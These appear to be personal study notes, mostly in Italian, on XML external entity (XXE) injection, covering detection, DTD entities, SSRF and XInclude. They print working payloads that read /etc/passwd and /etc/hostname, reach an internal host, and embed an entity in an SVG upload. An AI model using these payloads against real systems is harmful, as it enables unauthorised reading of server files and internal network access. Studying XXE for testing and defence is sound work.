xml external entity injection

DETECTION:
burp scanner può detectare xxe 
file retrieval definendo una external entity basata su well-known operating system file (bisogna conoscere i file name e path in base al sistema operativo specifico)
blind lookup con collaborator
possibile testare user supplied data per provare XInclude

vulnerabilità sul processo di dati XML
spesso permette di vedere file del backend file system e permette di intereagire con backend e applicazioni esterne con cui interagisce l'app vulnerabile.

in alcuni casi è possibile avanzare ad SSRF attraverso XXE

XML format usato per trasferimento di dati nel body delle richieste

di solito vengono usate librerie standard o API nel backend per elaborare il formato XML in dati leggibili

TIPI DI ATTACCO:
  - retrieve files
  - perform ssrf
  - exfiltrate data out-of-band
  - retrive data via error messages

struttura ad albero
DTD document type definition definisce la struttura di un documento XML
DTD dichiarata con DOCTYPE
DTD può essere contenuta già nel documento o importata da fonti esterne (external DTD) o ibrida.
custom entities possono essere definite nel DTD -> <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
per caricare entities da file esterno -> <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>

XXE per leggere file remoti 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

XXE per SSRF
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>

HIDDEN ATTACK SURFACE for XXE injection
possibile surface in posti dove non è visibile l'xml

xinclude attack:
applicazioni possono ricevere dati submittati, salvarli in documenti xlm e poi parsare i files
backend soap request processata da soap request
non è possibile fare il classico attacco modificando il DOCTYPE
è però possibile usare XInclude, parte della specifica XML che consente ai documenti XML di essere buildati da altri sotto documenti.
XInclude può essere messo in qualsiasi data value

da inserire al posto di un valore del parametro della richiesta:
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

XXE attacks via MODIFIED CONTENT TYPE

For example, if a normal request contains the following:
        
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar

Then you might be able submit the following request, with the same result:
        
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>

If the application tolerates requests containing XML in the 
message body, and parses the body content as XML, then you can reach the
 hidden XXE attack surface simply by reformatting requests to use the 
XML format.

XXE VIA FILE UPLOAD
Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

esempio di file SVG malevolo
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>        
